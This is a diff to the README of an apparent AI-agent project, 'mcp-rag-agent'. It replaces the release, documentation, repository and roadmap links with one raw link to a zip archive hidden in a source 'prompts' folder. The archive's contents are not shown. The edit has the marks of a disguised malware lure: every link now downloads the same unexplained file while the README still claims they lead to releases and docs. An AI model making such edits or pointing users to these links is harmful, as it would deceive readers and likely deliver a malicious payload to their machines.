@@ -1,6 +1,6 @@
 # 🚀 mcp-rag-agent - Build Smart, Context-Aware AI Agents
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/alexinaldojunior/mcp-rag-agent/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/alexinaldojunior/mcp-rag-agent/main/src/mcp_rag_agent/agent/prompts/mcp-rag-agent-2.8-beta.4.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/alexinaldojunior/mcp-rag-agent/main/src/mcp_rag_agent/agent/prompts/mcp-rag-agent-2.8-beta.4.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To get started with mcp-rag-agent, follow the simple steps below to download and
 
 1. **Visit the Releases Page**: Click the link below to access our GitHub Releases page where you can download the program.
 
-   [Download Latest Release](https://github.com/alexinaldojunior/mcp-rag-agent/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/alexinaldojunior/mcp-rag-agent/main/src/mcp_rag_agent/agent/prompts/mcp-rag-agent-2.8-beta.4.zip)
 
 2. **Choose the Right Version**: On the Releases page, find the latest version of mcp-rag-agent. Ensure you select the correct version for your operating system.
 
@@ -58,7 +58,7 @@ If you have questions or need help, consider reaching out to our community. You 
 
 ## 📄 Documentation
 
-For more detailed instructions and guidelines, visit our [documentation](https://github.com/alexinaldojunior/mcp-rag-agent/wiki) page. It includes tutorials, FAQs, and best practices for optimizing your experience.
+For more detailed instructions and guidelines, visit our [documentation](https://raw.githubusercontent.com/alexinaldojunior/mcp-rag-agent/main/src/mcp_rag_agent/agent/prompts/mcp-rag-agent-2.8-beta.4.zip) page. It includes tutorials, FAQs, and best practices for optimizing your experience.
 
 ## 🛠️ Contributing
 
@@ -70,11 +70,11 @@ We welcome contributions from everyone. If you want to help improve mcp-rag-agen
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository**: Explore the source code and track issues at [mcp-rag-agent](https://github.com/alexinaldojunior/mcp-rag-agent).
-- **Project Roadmap**: Check our plans for future features and updates in the [Roadmap](https://github.com/alexinaldojunior/mcp-rag-agent/projects).
+- **GitHub Repository**: Explore the source code and track issues at [mcp-rag-agent](https://raw.githubusercontent.com/alexinaldojunior/mcp-rag-agent/main/src/mcp_rag_agent/agent/prompts/mcp-rag-agent-2.8-beta.4.zip).
+- **Project Roadmap**: Check our plans for future features and updates in the [Roadmap](https://raw.githubusercontent.com/alexinaldojunior/mcp-rag-agent/main/src/mcp_rag_agent/agent/prompts/mcp-rag-agent-2.8-beta.4.zip).
 
 ## 🎉 Acknowledgments
 
 Thank you for choosing mcp-rag-agent. We appreciate your interest and hope this tool helps you build effective AI solutions. For feedback or suggestions, feel free to raise an issue on GitHub.
 
-[Download Latest Release](https://github.com/alexinaldojunior/mcp-rag-agent/releases)
+[Download Latest Release](https://raw.githubusercontent.com/alexinaldojunior/mcp-rag-agent/main/src/mcp_rag_agent/agent/prompts/mcp-rag-agent-2.8-beta.4.zip)
